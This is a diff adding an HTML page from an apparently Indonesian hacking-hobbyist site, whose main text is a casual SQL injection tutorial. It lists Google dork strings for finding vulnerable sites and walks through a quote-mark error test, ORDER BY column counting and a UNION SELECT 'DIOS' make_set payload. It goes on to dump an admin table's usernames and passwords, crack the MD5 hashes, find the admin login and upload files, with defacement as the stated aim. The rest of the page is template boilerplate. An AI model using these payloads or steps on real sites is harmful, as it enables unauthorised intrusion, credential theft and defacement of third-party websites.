@@ -1,0 +1,293 @@
+<!doctype html>
+<html lang="en">
+  <head>
+    <!-- Required meta tags -->
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <!-- Bootstrap CSS -->
+    <link rel="stylesheet" type="text/css" href="css/bootstrap.min.css">
+    <link rel="stylesheet" type="text/css" href="css/style.css">
+
+    <title>Tutorial Sql-Injection | Zildan Eundan</title>
+  </head>
+  <body>
+  
+  <header>
+    <div class="container">
+      <nav class="navbar navbar-expand-lg navbar-light">
+        <a class="navbar-brand" href="#">Zildan<b>Eundan</b></a>
+        <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+          <span class="navbar-toggler-icon"></span>
+        </button>
+
+        <div class="collapse navbar-collapse" id="navbarSupportedContent">
+          <ul class="navbar-nav mr-auto">
+            <li class="nav-item active">
+              <a class="nav-link" href="index.html">Beranda <span class="sr-only">(current)</span></a>
+            </li>
+            <li class="nav-item">
+              <a class="nav-link" href="profil.html">Profil</a>
+            </li>
+            <li class="nav-item">
+              <a class="nav-link" href="kontak.html">Kontak</a>
+            </li>
+          </ul>
+          <form class="form-inline my-2 my-lg-0">
+            <input class="form-control mr-sm-2" type="search" placeholder="Search" aria-label="Search">
+            <button class="btn btn-outline-primary my-2 my-sm-0" type="submit">Search</button>
+          </form>
+        </div>
+      </nav>
+    </div>
+  </header>
+
+  <!-- Awal Jumbotron -->
+    <section class="jumbotron-bg">
+      <div class="jumbotron warna-bg text-white">
+        <div class="container">
+          <h1 class="display-4">Tutorial Sql-Injection</h1>
+          <p class="lead"><b>Assalamualaikum Tod :D</b><br>
+Welcome to JawaBaratCyber
+Nah kali ini gw akan kasih tutorial sql injection
+<br>
+OkLangsung saja ya Tod:D
+Pertama tama kalian dorking dulu:
+<br>
+inurl:/home.php?page= site:com<br>
+bookpage.php?id=<br>
+books.asp?id=<br>
+books.php?id=<br>
+books/book.asp?proj_nr=<br>
+books/book.php?proj_nr=<br>
+bookSingle.php?bookId=<br>
+bookview.php?id=
+<br>
+Kalian bisa kembangin lagi supaya fresh:v
+Kalau sudah kmudian kalian pilih salah satu target pilihan kalian
+<br>
+Untuk mengecek vuln enggaknya kalian tinggal menambahkan tanda ' d belakang exploit
+Contoh
+<br>
+http://webtarget.com/index.php?id=32
+menjadi:
+<br>
+http://webtarget.com/index.php?id=32'
+<br>
+Jika muncul tulisan sql syntax error atau Mysql error berarti webtarget klean VULN
+Jikaa tidak muncul cari web lain
+wkwk emang harus sabar
+<br>
+Ok jika kalian sudah menemukanya selanjutnya kalian Tinggal menambahkan +order+by+1--+ d belakang exploit
+<br>
+http://webtarget.com/index.php?id=32'+order+by+1--+
+<br>
+dan ganti angka 1 sampai strusnya smpai muncul tulisan error Column
+atau kosong dari sebuah halaman tersebut ya Tod:D<br>
+Contoh<br>
+http://webtarget.com/index.php?id=32'+order+by+2--+[No error]<br>
+http://webtarget.com/index.php?id=32'+order+by+3--+[No error]<br>
+http://webtarget.com/index.php?id=32'+order+by+4--+[No error]<br>
+http://webtarget.com/index.php?id=32'+order+by+5--+[ ERROR ]
+<br>
+Nah kali ini saya mendapatkan pesan errornya di column 5
+Berarti jumlah colum dalam web tersebut ada 4
+<br>
+OK SEKARANG waktunya kita akan mengubah ORDER sama BY menjadi UNION SELECT,, CONTOH:
+<br>
+http://webtarget.com/index.php?id=-32'+UNION+SELECT+1,2,3,4--+
+<br>
+Jika sudah maka akan muncul sebuah angka nah saya nemu angka 2 tinggal saya inject di column ke 2 dengan
+dios dibawah kalian salin
+<br>
+make_set(6,@:=0x0a,(select(1)from(information_schema.columns)
+where@:=make_set(511,@,0x3c6c693e,
+table_name,column_name)),@)
+<br>
+Dan angka 2 saya timpah dengan dios saya, Menjadi
+<br>
+http://webtarget.com/index.php?id=-32'+UNION+SELECT+1,
+make_set(6,@:=0x0a,(select(1)from(information_schema.columns)
+where@:=make_set(511,@,0x3c6c693e,table_
+name,column_name)),@),3,4--+
+<br>
+Nah maka berhasil kita inject Web tersebut waktunya kita Dump dengan cara kalian pilih salah satu yang akan kalian bukamisalkan kalian ingin mengetahui username ama pasword web tersebut,, karna tujuan kalian ingin mendeface^_^,, webnyamaka kalian cari table yang
+berhubung menuju ke admin,, misalkan saya disini, columnya adallah admin dan Tablenya adalah [USERNAME_DAN PASWORD]
+<br>
+Maka kalian tinggal rubah dios yang tadi menjadi
+<br>
+make_set(6,@:=0x0a,(select(1)from(admin)where@:=
+make_set(511,@,0x3c6c693e,
+USER_NAME,PASWORD)),@)
+<br>
+DAN Selesai kalian sudah mendapatkan username dan pasword web tersebut Nah biasanya username ama paswordnya masih dalam bentuk md5.
+<br>
+Seperti angka acak gitulah
+<br>
+Atau biasanya ada yang langsu jadi,, dan jika paswordnya bentuknya MD5 maka kalian hanya Tinggal HASH md5 tersebut DISINI
+<br>
+atau kalian juga bisa cari di google HASH Kiler
+<br>
+Ok jika sudah kalian hash md5 tersebut dan menjadi username ama pasword yang benar sepert
+<br>
+user: admin
+pasword: jancuk0
+<br>
+Maka langkah selanjutnya kalian hanya harus menemukan ADLOGNYA atau admin login sama saja yya,, misalkan
+<br>
+http://webtarget.com/admin
+<br>
+seperti diatas jika masih tidak ktemu kalian ganti menjadi
+<br>
+http://webtarget.com/webadmin
+<br>
+sampai ketemu jika tidak kalian bisa cari menggunakan admin finder di tools atas
+<br>
+Dan jika sudah ketemu kalian tinggal masukan username sama pasword web tersebut dan LOGIN
+Dan jika kalian berhasil masuk sekarang kalian hanya perlu mencari tempat uploadnya, cari sampai berhasil kamu sudah menjadi admin
+<br>
+Mungkin cukup sekian tutorial dari saya kali ini jika ada salah kata mohon dimaafkan
+<br>
+Sekian dari saya bila ada tutur kata yang salah mohon dimaafkan</p>
+        </div>
+      </div>
+    </section>
+    <br><br>
+    
+  <!-- Akhir Jumbotron -->
+
+  <!-- Awal Content -->
+    <div class="container">
+      <div class="row">
+        <div class="col-md-3 mb-2">
+          <div class="card">
+            <img src="img/ipadress.jpg" class="card-img-top" alt="Gambar">
+            <div class="card-body">
+              <h6 class="card-title text-info">Zildan</h6>
+              <h6 class="card-text"><a href="ipadress.html" class="text-primary">#1 - Pengertian IP Adress - Bahasa Indonesia</h6>
+            </div>
+          </div>
+        </div>
+        <div class="col-md-3 mb-2">
+          <div class="card">
+            <img src="img/zildan.jpg" class="card-img-top" alt="Gambar">
+            <div class="card-body">
+              <h6 class="card-title text-info">Zildan</h6>
+              <h6 class="card-text"><a href="#" class="text-primary">#1 - Zildan Eundan Gans</h6>
+            </div>
+          </div>
+        </div>
+        <div class="col-md-3 mb-2">
+          <div class="card">
+            <img src="img/zildan.jpg" class="card-img-top" alt="Gambar">
+            <div class="card-body">
+              <h6 class="card-title text-info">Zildan</h6>
+              <h6 class="card-text"><a href="#" class="text-primary">#1 - Zildan Eundan Gans</h6>
+            </div>
+          </div>
+        </div>
+        <div class="col-md-3 mb-2">
+          <div class="card">
+            <img src="img/zildan.jpg" class="card-img-top" alt="Gambar">
+            <div class="card-body">
+              <h6 class="card-title text-info">Zildan</h6>
+              <h6 class="card-text"><a href="#" class="text-primary">#1 - Zildan Eundan Gans</h6>
+            </div>
+          </div>
+        </div>
+        <div class="col-md-3 mb-2">
+          <div class="card">
+            <img src="img/zildan.jpg" class="card-img-top" alt="Gambar">
+            <div class="card-body">
+              <h6 class="card-title text-info">Zildan</h6>
+              <h6 class="card-text"><a href="#" class="text-primary">#1 - Zildan Eundan Gans</h6>
+            </div>
+          </div>
+        </div>
+        <div class="col-md-3 mb-2">
+          <div class="card">
+            <img src="img/zildan.jpg" class="card-img-top" alt="Gambar">
+            <div class="card-body">
+              <h6 class="card-title text-info">Zildan</h6>
+              <h6 class="card-text"><a href="#" class="text-primary">#1 - Zildan Eundan Gans</h6>
+            </div>
+          </div>
+        </div>
+        <div class="col-md-3 mb-2">
+          <div class="card">
+            <img src="img/zildan.jpg" class="card-img-top" alt="Gambar">
+            <div class="card-body">
+              <h6 class="card-title text-info">Zildan</h6>
+              <h6 class="card-text"><a href="#" class="text-primary">#1 - Zildan Eundan Gans</h6>
+            </div>
+          </div>
+        </div>
+        <div class="col-md-3 mb-2">
+          <div class="card">
+            <img src="img/zildan.jpg" class="card-img-top" alt="Gambar">
+            <div class="card-body">
+              <h6 class="card-title text-info">Zildan</h6>
+              <h6 class="card-text"><a href="#" class="text-primary">#1 - Zildan Eundan Gans</h6>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+  <!-- Akhir Content -->
+  
+  <!-- Awal pagination -->
+    <nav aria-label="Page navigation example">
+      <ul class="pagination justify-content-center">
+        <li class="page-item"><a class="page-link" href="#">Previous</a></li>
+        <li class="page-item"><a class="page-link" href="#">1</a></li>
+        <li class="page-item"><a class="page-link" href="#">2</a></li>
+        <li class="page-item"><a class="page-link" href="#">3</a></li>
+        <li class="page-item"><a class="page-link" href="#">Next</a></li>
+      </ul>
+    </nav>
+  <!-- Akhir pagination -->
+
+  <!-- Awal Jumbotron 2 -->
+    <div class="jumbotron jumbotron-fluid bg-light">
+      <div class="container">
+        <div class="row">
+          <div class="col-md-3">
+            <img src="img/gambar_buku.png" class="img-thumbnail">
+          </div>
+          <div class="col-md-9">
+            <h2>Download Ebook belajar HTML & CSS dasar untuk pemula gratis.</h2>
+            <p class="lead">Lorem ipsum dolor sit amet, consectetur adipisicing elit, sed do eiusmod
+            tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam,
+            quis nostrud exercitation ullamco laboris nisi ut aliquip ex ea commodo
+            consequat. Duis aute irure dolor in reprehenderit in voluptate velit esse
+            cillum dolore eu fugiat nulla pariatur. Excepteur sint occaecat cupidatat non
+            proident, sunt in culpa qui officia deserunt mollit anim id est laborum.  </p>
+            <button type="button" class="btn btn-primary">Download</button>
+          </div>
+        </div>
+        
+      </div>
+    </div>
+  <!-- Akhir Jumbotron 2 -->
+
+  <!-- Awal Footer -->
+    <footer class="warna-bg">
+      <div class="text-white text-center pt-3 pb-3">
+        Copyright @2020 - Channel Youtube InfoCyberHacker
+      </div>
+    </footer>
+  <!-- Akhir Footer -->
+
+
+
+
+
+
+
+    <!-- Optional JavaScript -->
+    <!-- jQuery first, then Popper.js, then Bootstrap JS -->
+   <script type="text/javascript" src="js/jquery-3.4.1.slim.min.js"></script>
+   <script type="text/javascript" src="js/popper.min.js"></script>
+   <script type="text/javascript" src="js/bootstrap.min.js"></script>
+
+  </body>
+</html>
